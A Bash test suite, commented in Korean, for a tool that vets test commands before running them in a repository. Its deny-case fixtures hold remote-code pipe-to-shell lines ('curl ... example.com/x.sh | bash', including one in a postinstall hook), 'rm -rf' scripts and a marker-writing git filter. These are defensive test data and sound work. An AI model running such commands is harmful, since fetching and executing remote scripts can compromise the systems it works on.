#!/bin/bash
# tests/test-verification.sh — --run-tests 검증 실행 (SPEC §10.3, §16.7)
# 가짜 npm·make 를 PATH 앞에 넣어 실제 패키지 관리자·네트워크를 쓰지 않는다.
. "$(dirname "$0")/lib.sh"
setup_sandbox

# ---------------------------------------------------------------- 로컬 헬퍼

FAKEBIN="$TEST_ROOT/fakebin"
FAKE_LOG="$TEST_ROOT/fake.log"
mkdir -p "$FAKEBIN"

# 가짜 npm: --version 은 FAKE_NPM_VERSION, 그 밖에는 인자·환경·표준입력을 기록하고 FAKE_ACT 실행
cat >"$FAKEBIN/npm" <<'EOF'
#!/bin/bash
if [ "${1:-}" = --version ]; then echo "${FAKE_NPM_VERSION:-10.8.2}"; exit 0; fi
{
	printf 'npm-args:%s\n' "$*"
	printf 'pwd:%s\n' "$PWD"
	env | grep -E '^(CI|HUSKY|npm_config_ignore_scripts|npm_config_offline|GOPROXY|GOFLAGS|CARGO_NET_OFFLINE|PIP_NO_INDEX|PYTHONDONTWRITEBYTECODE)=' | sort
	if [ "$(stat -L -f '%Z' /dev/stdin 2>/dev/null)" = "$(stat -f '%Z' /dev/null)" ]; then echo 'stdin:null'; else echo 'stdin:other'; fi
} >>"${FAKE_LOG:-/dev/null}"
if [ -n "${FAKE_ACT:-}" ]; then /bin/bash -c "$FAKE_ACT"; exit $?; fi
exit 0
EOF
# 가짜 make: 인자를 기록하고 FAKE_ACT 실행(레시피를 실제로 돌리지 않음)
cat >"$FAKEBIN/make" <<'EOF'
#!/bin/bash
printf 'make-args:%s\n' "$*" >>"${FAKE_LOG:-/dev/null}"
if [ -n "${FAKE_ACT:-}" ]; then /bin/bash -c "$FAKE_ACT"; exit $?; fi
exit 0
EOF
chmod +x "$FAKEBIN/npm" "$FAKEBIN/make"
export PATH="$FAKEBIN:$PATH"
export FAKE_LOG

# mk_repo <dir> <package.json 내용 또는 빈 문자열> : 커밋 1개가 있는 저장소
mk_repo() {
	new_repo "$1"
	(
		cd "$1" || exit 1
		printf 'node_modules/\ncoverage/\ndist/\n*.log\n' >.gitignore
		echo 'base' >a.txt
		[ -z "$2" ] || printf '%s\n' "$2" >package.json
		gcommit init
	)
}

# verify <out 파일> <args...> : 실행하고 종료 코드를 RC 에 남김
RC=0
verify() {
	local out=$1
	shift
	RC=0
	/bin/bash "$VERIFY" "$@" >"$out" 2>"$out.err" || RC=$?
}

# section <out> <섹션> : [섹션] 본문
section() { mf_section "$1" "$2"; }

OUT="$TEST_ROOT/out.txt"

# ---------------------------------------------------------------- 허용: 단순 npm test

R1="$TEST_ROOT/r1"
mk_repo "$R1" '{"name":"r1","scripts":{"test":"jest --ci","pretest":"echo pre"}}'
: >"$FAKE_LOG"
verify "$OUT" --repo "$R1" -- npm test
assert_eq "npm test 허용·성공 시 종료 코드 0" 0 "$RC"
assert_eq "출력 첫 줄" "CODE_SENTINEL_VERIFY 1" "$(head -n 1 "$OUT")"
assert_eq "decision allow" allow "$(mf_get "$OUT" decision)"
assert_eq "reasons 없음" - "$(mf_get "$OUT" reasons)"
assert_eq "npm 7 이상은 hooks_suppressed yes" yes "$(mf_get "$OUT" hooks_suppressed)"
assert_eq "exit_code 0" 0 "$(mf_get "$OUT" exit_code)"
assert_eq "변경 없음" none "$(mf_get "$OUT" changes)"
assert_eq "timed_out no" no "$(mf_get "$OUT" timed_out)"
dur=$(mf_get "$OUT" duration)
case "$dur" in '' | *[!0-9]*) fail "duration 은 정수 초" "[$dur]" ;; *) pass "duration 은 정수 초" ;; esac
LOG=$(mf_get "$OUT" log_file)
CTXD=$(mf_get "$OUT" context_dir)
if [ -f "$LOG" ]; then pass "출력 로그 파일 존재"; else fail "출력 로그 파일 존재" "$LOG"; fi
assert_eq "로그는 context_dir 안" "$CTXD" "${LOG%/*}"
assert_eq "context_dir 는 TMPDIR 바로 아래" "$(cd -P "$TMPDIR" && pwd -P)" "${CTXD%/*}"
case "${CTXD##*/}" in code-sentinel.*) pass "context_dir 이름 접두어" ;; *) fail "context_dir 이름 접두어" "$CTXD" ;; esac
marker=$(cat "$CTXD/.code-sentinel-context" 2>/dev/null || true)
if printf '%s\n' "$marker" | awk 'NR==1 && /^created_at [0-9]+$/ {a=1} NR==2 && /^pid [0-9]+$/ {b=1} NR==3 && /^token [0-9a-f]{32}$/ {c=1} END {exit !(a && b && c && NR == 3)}'; then
	pass "context_dir 마커 형식"
else
	fail "context_dir 마커 형식" "$marker"
fi
perm=$(stat -f '%Lp' "$CTXD" 2>/dev/null || true)
assert_eq "context_dir 권한 700" 700 "$perm"
flog=$(cat "$FAKE_LOG")
assert_contains "명령 실행됨" "$flog" "npm-args:test"
assert_contains "환경 CI=1" "$flog" "CI=1"
assert_contains "환경 HUSKY=0" "$flog" "HUSKY=0"
assert_contains "환경 npm_config_ignore_scripts" "$flog" "npm_config_ignore_scripts=true"
assert_contains "환경 npm_config_offline" "$flog" "npm_config_offline=true"
assert_contains "환경 GOPROXY=off" "$flog" "GOPROXY=off"
assert_contains "환경 GOFLAGS" "$flog" "GOFLAGS=-mod=readonly"
assert_contains "환경 CARGO_NET_OFFLINE" "$flog" "CARGO_NET_OFFLINE=true"
assert_contains "환경 PIP_NO_INDEX" "$flog" "PIP_NO_INDEX=1"
assert_contains "환경 PYTHONDONTWRITEBYTECODE" "$flog" "PYTHONDONTWRITEBYTECODE=1"
assert_contains "표준입력 /dev/null" "$flog" "stdin:null"
assert_contains "repo 에서 실행" "$flog" "pwd:$(cd -P "$R1" && pwd -P)"
assert_contains "격리 미확인 문구" "$(section "$OUT" NOTES)" "격리 활성 여부는 확인하지 못함"
assert_contains "저장소 밖 부수 효과 한계 문구" "$(section "$OUT" NOTES)" "저장소 밖 부수 효과"
assert_contains "pretest 훅도 검사 목록에 있음" "$(section "$OUT" CHECKED)" "pretest"
assert_exit "로그 디렉터리는 cleanup-context.sh 로 정리됨" 0 /bin/bash "$CLEANUP" "$CTXD"
if [ ! -e "$CTXD" ]; then pass "로그 디렉터리 삭제됨"; else fail "로그 디렉터리 삭제됨" "$CTXD"; fi

# --check 는 실행하지 않음
: >"$FAKE_LOG"
verify "$OUT" --repo "$R1" --check -- npm test
assert_eq "--check 허용은 종료 코드 0" 0 "$RC"
assert_eq "--check decision allow" allow "$(mf_get "$OUT" decision)"
assert_eq "--check mode" check "$(mf_get "$OUT" mode)"
assert_not_contains "--check 는 명령을 실행하지 않음" "$(cat "$FAKE_LOG")" "npm-args"
assert_eq "--check 는 log_file 없음" - "$(mf_get "$OUT" log_file)"
left=$(ls -d "$TMPDIR"/code-sentinel.* 2>/dev/null | wc -l | tr -d ' ')
assert_eq "--check 후 임시 디렉터리 남지 않음" 0 "$left"

# 하위 디렉터리에서 실행(--repo 생략)
mkdir -p "$R1/sub"
RC=0
(cd "$R1/sub" && /bin/bash "$VERIFY" --check -- npm test) >"$OUT" 2>&1 || RC=$?
assert_eq "하위 디렉터리에서 상위 package.json 사용" 0 "$RC"

# npm 6 은 hooks_suppressed unknown
FAKE_NPM_VERSION=6.14.18 /bin/bash "$VERIFY" --repo "$R1" --check -- npm test >"$OUT" 2>&1 || true
assert_eq "npm 6 은 hooks_suppressed unknown" unknown "$(mf_get "$OUT" hooks_suppressed)"

# 명령 실패 → 10
FAKE_ACT='echo failing; exit 3' verify "$OUT" --repo "$R1" -- npm test
assert_eq "명령 실패는 종료 코드 10" 10 "$RC"
assert_eq "실패 exit_code 기록" 3 "$(mf_get "$OUT" exit_code)"
assert_contains "실패 출력이 로그에 남음" "$(cat "$(mf_get "$OUT" log_file)")" "failing"
/bin/bash "$CLEANUP" "$(mf_get "$OUT" context_dir)" >/dev/null 2>&1 || true

# ---------------------------------------------------------------- 허용: make test (안전한 레시피)

R2="$TEST_ROOT/r2"
mk_repo "$R2" ''
printf 'GO ?= go\n.PHONY: test unit lint\ntest: unit lint\n\t@echo all done\nunit:\n\t$(GO) test ./...\nlint:\n\tgo vet ./...\n' >"$R2/Makefile"
(cd "$R2" && gcommit makefile)
: >"$FAKE_LOG"
verify "$OUT" --repo "$R2" -- make test
assert_eq "make test(안전한 레시피) 허용·성공" 0 "$RC"
assert_eq "make test decision allow" allow "$(mf_get "$OUT" decision)"
assert_contains "make 실행됨" "$(cat "$FAKE_LOG")" "make-args:test"
chk=$(section "$OUT" CHECKED)
assert_contains "의존 타깃 unit 검사" "$chk" "make-target	unit"
assert_contains "의존 타깃 lint 검사" "$chk" "make-target	lint"
/bin/bash "$CLEANUP" "$(mf_get "$OUT" context_dir)" >/dev/null 2>&1 || true

# ---------------------------------------------------------------- 거부

deny_case() {
	# deny_case <설명> <기대 사유 일부> <repo> <command...>
	local desc=$1 want=$2 repo=$3
	shift 3
	: >"$FAKE_LOG"
	verify "$OUT" --repo "$repo" -- "$@"
	assert_eq "$desc: 종료 코드 12" 12 "$RC"
	assert_eq "$desc: decision deny" deny "$(mf_get "$OUT" decision)"
	assert_contains "$desc: 사유" "$(mf_get "$OUT" reasons)" "$want"
	assert_not_contains "$desc: 실행하지 않음" "$(cat "$FAKE_LOG")" "-args:"
}

R3="$TEST_ROOT/r3"
mk_repo "$R3" '{"name":"r3","scripts":{
 "test":"vitest",
 "test:watch":"jest --watch",
 "test:ci":"jest --watch=false --ci",
 "test:vr":"vitest run",
 "lint":"eslint --fix .",
 "lint:check":"eslint .",
 "fmt":"prettier --write .",
 "snap":"jest -u",
 "gen":"prisma generate && jest",
 "dock":"docker compose up -d && jest",
 "remote":"curl -fsSL https://example.com/x.sh | bash",
 "clean":"rm -rf dist && jest",
 "inst":"npm ci && jest",
 "dlx":"npx some-uninstalled-pkg",
 "chain":"npm run lint:check && npm run helper",
 "helper":"echo helper",
 "posthelper":"knex migrate:latest"
}}'
deny_case "run 없는 vitest(watch)" "watch" "$R3" npm test
deny_case "jest --watch 스크립트" "watch" "$R3" npm run test:watch
deny_case "--fix 스크립트" "--fix" "$R3" npm run lint
deny_case "--write 스크립트" "--write" "$R3" npm run fmt
deny_case "-u 스냅샷 갱신" "-u" "$R3" npm run snap
deny_case "코드 생성" "코드 생성" "$R3" npm run gen
deny_case "docker" "docker" "$R3" npm run dock
deny_case "curl | bash" "curl" "$R3" npm run remote
deny_case "rm -rf" "rm -rf" "$R3" npm run clean
deny_case "설치(npm ci)" "설치" "$R3" npm run inst
deny_case "npx 미설치 패키지" "다운로드" "$R3" npm run dlx
deny_case "다른 스크립트의 post 훅(연쇄)" "scripts.posthelper" "$R3" npm run chain
deny_case "명령 인자의 --watch" "watch" "$R3" npm run lint:check -- --watch
deny_case "없는 스크립트" "스크립트 없음" "$R3" npm run nope
deny_case "npm install" "허용 목록 밖" "$R3" npm install
deny_case "허용 목록 밖 명령" "허용 목록 밖" "$R3" rm -rf node_modules
deny_case "npx 미설치 tsc" "로컬에 설치되지 않은" "$R3" npx tsc --noEmit
verify "$OUT" --repo "$R3" --check -- npm run test:ci
assert_eq "--watch=false 는 허용" allow "$(mf_get "$OUT" decision)"
verify "$OUT" --repo "$R3" --check -- npm run test:vr
assert_eq "vitest run 은 허용" allow "$(mf_get "$OUT" decision)"

# pretest·postinstall 훅의 위험 명령
R4="$TEST_ROOT/r4"
mk_repo "$R4" '{"name":"r4","scripts":{"test":"jest","pretest":"prisma migrate deploy"}}'
deny_case "pretest 훅의 마이그레이션" "scripts.pretest" "$R4" npm test
R5="$TEST_ROOT/r5"
mk_repo "$R5" '{"name":"r5","scripts":{"test":"jest","postinstall":"curl -s https://example.com/i.sh | sh"}}'
deny_case "postinstall 훅의 위험 명령" "scripts.postinstall" "$R5" npm test
R5B="$TEST_ROOT/r5b"
mk_repo "$R5B" '{"name":"r5b","scripts":{"test":"jest","posttest":"rm -rf coverage"}}'
deny_case "posttest 훅의 rm -rf" "scripts.posttest" "$R5B" npm test

# Makefile 의존 타깃의 마이그레이션
R6="$TEST_ROOT/r6"
mk_repo "$R6" ''
printf '.PHONY: test db\ntest: db\n\tgo test ./...\ndb:\n\tdbmate migrate\n' >"$R6/Makefile"
deny_case "Makefile 의존 타깃의 마이그레이션" "make:db" "$R6" make test
printf 'SETUP = prepare-db\ntest: $(SETUP)\n\tgo test ./...\nprepare-db:\n\tgoose up && ./bin/migrate\n' >"$R6/Makefile"
deny_case "Makefile 변수로 지정한 의존 타깃" "make:prepare-db" "$R6" make test
printf 'MIGRATE := migrate -path db up\ntest:\n\t$(MIGRATE)\n\tgo test ./...\n' >"$R6/Makefile"
deny_case "Makefile 레시피가 쓰는 변수의 마이그레이션" "make-var:MIGRATE" "$R6" make test
printf 'test:\n\t$(MAKE) prep\n\tgo test ./...\nprep:\n\tdocker compose up -d\n' >"$R6/Makefile"
deny_case "재귀 make 타깃의 docker" "docker" "$R6" make test
printf 'test:\n\tgo test ./...\n' >"$R6/Makefile"
deny_case "Makefile 에 없는 타깃" "타깃 없음" "$R6" make nothing
printf 'include rules.mk\ntest: setup\n\tgo test ./...\n' >"$R6/Makefile"
printf 'setup:\n\tnpm install\n' >"$R6/rules.mk"
deny_case "include 한 Makefile 의 의존 타깃" "설치" "$R6" make test
printf 'test:\n\tnpm run unit\n' >"$R6/Makefile"
printf '{"scripts":{"unit":"jest --watchAll"}}\n' >"$R6/package.json"
deny_case "make 레시피가 부르는 npm 스크립트" "scripts.unit" "$R6" make test
rm -f "$R6/package.json" "$R6/rules.mk"

# .env 자격증명 흔적
R7="$TEST_ROOT/r7"
mk_repo "$R7" '{"name":"r7","scripts":{"test":"jest","test:env":"dotenv -e .env.test -- jest"}}'
deny_case "스크립트가 .env 를 불러옴" ".env" "$R7" npm run test:env
verify "$OUT" --repo "$R7" --check -- npm test
assert_eq ".env 파일이 없으면 npm test 허용" allow "$(mf_get "$OUT" decision)"
printf 'NODE_ENV=test\nAPI_TOKEN=abcd1234\n' >"$R7/.env.local"
deny_case ".env.local 자격증명 파일" ".env 자격증명" "$R7" npm test
rm -f "$R7/.env.local"
printf 'DATABASE_URL=postgres://u:p@db.example.com:5432/app\n' >"$R7/.env"
deny_case ".env 실제 DB 접속 설정" "DB" "$R7" npm test
rm -f "$R7/.env"
printf 'API_TOKEN=\nDATABASE_URL=postgres://user:pass@localhost/app\n' >"$R7/.env.example"
verify "$OUT" --repo "$R7" --check -- npm test
assert_eq ".env.example 은 검사하지 않음" allow "$(mf_get "$OUT" decision)"

# testcontainers
R8="$TEST_ROOT/r8"
mk_repo "$R8" '{"name":"r8","scripts":{"test":"jest"},"devDependencies":{"@testcontainers/postgresql":"10.0.0"}}'
deny_case "testcontainers 의존성" "testcontainers" "$R8" npm test

# ---------------------------------------------------------------- 점이 든 키(test.unit)

R9="$TEST_ROOT/r9"
mk_repo "$R9" '{"name":"r9","scripts":{"test":"echo top","test.unit":"jest --ci","test.watch":"jest --watch","pretest.unit":"echo pre-dotted"}}'
verify "$OUT" --repo "$R9" --check -- npm run test.unit
assert_eq "점 든 키 test.unit 허용" allow "$(mf_get "$OUT" decision)"
chk=$(section "$OUT" CHECKED)
assert_contains "점 든 키 test.unit 검사 목록" "$chk" "script	test.unit	target"
assert_contains "점 든 키의 pre 훅(pretest.unit)" "$chk" "script	pretest.unit	hook"
deny_case "점 든 키 test.watch 내용 검사" "scripts.test.watch" "$R9" npm run test.watch

# ---------------------------------------------------------------- 전후 비교

# 이미 수정된 추적 파일을 다시 수정 → 내용 비교로 감지
R10="$TEST_ROOT/r10"
mk_repo "$R10" '{"name":"r10","scripts":{"test":"jest"}}'
echo 'local edit' >>"$R10/a.txt"
echo 'untracked before' >"$R10/u.txt"
FAKE_ACT='echo more >> a.txt' verify "$OUT" --repo "$R10" -- npm test
assert_eq "재수정 실행 성공" 0 "$RC"
assert_eq "재수정 changes detected" detected "$(mf_get "$OUT" changes)"
tc=$(section "$OUT" TRACKED_CHANGES)
assert_contains "이미 M 인 파일의 내용 변경 감지" "$tc" "content	a.txt"
assert_eq "tracked_changes 1" 1 "$(mf_get "$OUT" tracked_changes)"
/bin/bash "$CLEANUP" "$(mf_get "$OUT" context_dir)" >/dev/null 2>&1 || true

# 기존 untracked 파일 변경·새 untracked 파일·깨끗한 추적 파일 변경
git -C "$R10" checkout -q -- a.txt
FAKE_ACT='echo x >> u.txt; echo n > new.txt; echo y >> package.json' verify "$OUT" --repo "$R10" -- npm test
nu=$(section "$OUT" NEW_UNTRACKED)
assert_contains "새 untracked 파일 감지" "$nu" "new	new.txt"
assert_contains "기존 untracked 파일 내용 변경 감지" "$nu" "modified	u.txt	content"
assert_contains "깨끗한 추적 파일 변경 감지" "$(section "$OUT" TRACKED_CHANGES)" "status	package.json	clean -> .M"
/bin/bash "$CLEANUP" "$(mf_get "$OUT" context_dir)" >/dev/null 2>&1 || true
git -C "$R10" checkout -q -- package.json
rm -f "$R10/new.txt"

# 모드·링크 변경
ln -s a.txt "$R10/link"
chmod 644 "$R10/u.txt"
FAKE_ACT='chmod 755 u.txt; rm link; ln -s package.json link' verify "$OUT" --repo "$R10" -- npm test
nu=$(section "$OUT" NEW_UNTRACKED)
assert_contains "모드 변경 감지" "$nu" "modified	u.txt	mode"
assert_contains "링크 대상 변경 감지" "$nu" "modified	link	link"
/bin/bash "$CLEANUP" "$(mf_get "$OUT" context_dir)" >/dev/null 2>&1 || true
rm -f "$R10/link" "$R10/u.txt"

# ignored 산출물 디렉터리 생성
R11="$TEST_ROOT/r11"
mk_repo "$R11" '{"name":"r11","scripts":{"test":"jest --coverage"}}'
mkdir -p "$R11/dist"
echo old >"$R11/dist/keep.js"
FAKE_ACT='mkdir -p coverage && echo lcov > coverage/lcov.info; echo changed > dist/keep.js' verify "$OUT" --repo "$R11" -- npm test
assert_eq "ignored 생성 실행 성공" 0 "$RC"
ig=$(section "$OUT" IGNORED_DIRS)
assert_contains "ignored 산출물 디렉터리 생성 감지" "$ig" "created	coverage/"
assert_not_contains "기존 ignored 디렉터리 안 내용 변경은 범위 밖" "$ig" "dist/"
assert_eq "ignored_dirs 1" 1 "$(mf_get "$OUT" ignored_dirs)"
assert_eq "추적 파일 변경 없음" 0 "$(mf_get "$OUT" tracked_changes)"
/bin/bash "$CLEANUP" "$(mf_get "$OUT" context_dir)" >/dev/null 2>&1 || true

# refs·index 변경
R12="$TEST_ROOT/r12"
mk_repo "$R12" '{"name":"r12","scripts":{"test":"jest"}}'
echo extra >"$R12/b.txt"
FAKE_ACT='git branch side-branch && git add b.txt && git config --local test.touched yes' verify "$OUT" --repo "$R12" -- npm test
assert_eq "refs·index 변경 실행 성공" 0 "$RC"
ri=$(section "$OUT" REFS_INDEX)
assert_contains "새 ref 감지" "$ri" "ref	refs/heads/side-branch	created"
assert_contains "index 변경 감지" "$ri" "index	changed"
assert_contains "config 변경 감지" "$ri" "config	changed"
assert_contains "b.txt 상태 변화(?? -> A.)" "$(section "$OUT" NEW_UNTRACKED)" "status	b.txt	?? -> A."
/bin/bash "$CLEANUP" "$(mf_get "$OUT" context_dir)" >/dev/null 2>&1 || true
FAKE_ACT='git -c commit.gpgsign=false commit -q -m second' verify "$OUT" --repo "$R12" -- npm test
ri=$(section "$OUT" REFS_INDEX)
assert_contains "HEAD 이동 감지" "$ri" "HEAD	"
assert_contains "브랜치 이동 감지" "$ri" "ref	refs/heads/main	moved"
/bin/bash "$CLEANUP" "$(mf_get "$OUT" context_dir)" >/dev/null 2>&1 || true

# index 가 없는 저장소(커밋 없음)
R13="$TEST_ROOT/r13"
new_repo "$R13"
printf '{"scripts":{"test":"jest"}}\n' >"$R13/package.json"
if [ -e "$(git -C "$R13" rev-parse --git-path index)" ]; then
	skip "index 없는 저장소" "git init 이 index 를 만듦"
else
	FAKE_ACT='git add package.json' verify "$OUT" --repo "$R13" -- npm test
	assert_eq "index 없는 저장소에서 실행" 0 "$RC"
	assert_contains "index 생성 감지" "$(section "$OUT" REFS_INDEX)" "index	created"
	/bin/bash "$CLEANUP" "$(mf_get "$OUT" context_dir)" >/dev/null 2>&1 || true
fi

# clean 필터가 전후 비교 중 실행되지 않음
R14="$TEST_ROOT/r14"
mk_repo "$R14" '{"name":"r14","scripts":{"test":"jest"}}'
FMARK="$TEST_ROOT/filter-ran"
printf '*.dat filter=evil\n' >"$R14/.gitattributes"
echo 'aaaa' >"$R14/x.dat"
(cd "$R14" && gcommit attrs)
git -C "$R14" config filter.evil.clean "touch '$FMARK'; cat"
git -C "$R14" config filter.evil.smudge "touch '$FMARK'; cat"
git -C "$R14" config filter.evil.required true
echo 'bbbb' >"$R14/x.dat"
rm -f "$FMARK"
FAKE_ACT='echo cccc > x.dat' verify "$OUT" --repo "$R14" -- npm test
assert_eq "필터 저장소에서 실행 성공" 0 "$RC"
if [ -e "$FMARK" ]; then fail "전후 비교 중 clean 필터 미실행" "필터가 실행됨"; else pass "전후 비교 중 clean 필터 미실행"; fi
assert_contains "필터 대상 파일 내용 변경도 감지" "$(section "$OUT" TRACKED_CHANGES)" "content	x.dat"
/bin/bash "$CLEANUP" "$(mf_get "$OUT" context_dir)" >/dev/null 2>&1 || true

# ---------------------------------------------------------------- 타임아웃

R15="$TEST_ROOT/r15"
mk_repo "$R15" '{"name":"r15","scripts":{"test":"jest"}}'
CPID="$TEST_ROOT/child.pid"
GPID="$TEST_ROOT/grandchild.pid"
t0=$(date +%s)
FAKE_ACT="sleep 60 & echo \$! > '$CPID'; /bin/bash -c 'sleep 60 & echo \$! > \"$GPID\"; wait' & sleep 60" \
	verify "$OUT" --repo "$R15" --timeout 2 -- npm test
t1=$(date +%s)
assert_eq "타임아웃은 종료 코드 11" 11 "$RC"
assert_eq "timed_out yes" yes "$(mf_get "$OUT" timed_out)"
el=$((t1 - t0))
if [ "$el" -lt 15 ]; then pass "타임아웃 후 곧바로 종료(${el}s)"; else fail "타임아웃 후 곧바로 종료" "${el}s"; fi
alive=""
for pf in "$CPID" "$GPID"; do
	[ -s "$pf" ] || { alive="$alive missing:$pf"; continue; }
	p=$(cat "$pf")
	i=0
	while kill -0 "$p" 2>/dev/null && [ "$i" -lt 20 ]; do sleep 0.1; i=$((i + 1)); done
	if kill -0 "$p" 2>/dev/null; then alive="$alive $p"; kill -9 "$p" 2>/dev/null || true; fi
done
assert_eq "타임아웃 시 자식·손자 프로세스까지 종료" "" "$alive"
/bin/bash "$CLEANUP" "$(mf_get "$OUT" context_dir)" >/dev/null 2>&1 || true

# ---------------------------------------------------------------- 사용법·환경 오류

assert_exit "-- 없음은 사용법 오류" 2 /bin/bash "$VERIFY" --repo "$R1" npm test
assert_exit "알 수 없는 옵션은 사용법 오류" 2 /bin/bash "$VERIFY" --bogus -- npm test
assert_exit "잘못된 --timeout 은 사용법 오류" 2 /bin/bash "$VERIFY" --timeout 0 -- npm test
assert_exit "숫자 아닌 --timeout 은 사용법 오류" 2 /bin/bash "$VERIFY" --timeout abc -- npm test
assert_exit "-- 뒤 명령 없음은 사용법 오류" 2 /bin/bash "$VERIFY" --repo "$R1" --
mkdir -p "$TEST_ROOT/plain"
assert_exit "Git 저장소 아님은 종료 코드 3" 3 /bin/bash "$VERIFY" --repo "$TEST_ROOT/plain" -- npm test
assert_exit "없는 디렉터리는 종료 코드 3" 3 /bin/bash "$VERIFY" --repo "$TEST_ROOT/nope" -- npm test

left=$(ls -d "$TMPDIR"/code-sentinel.* 2>/dev/null | wc -l | tr -d ' ')
assert_eq "모든 실행 후 남은 임시 디렉터리 없음(정리 호출 포함)" 0 "$left"

finish
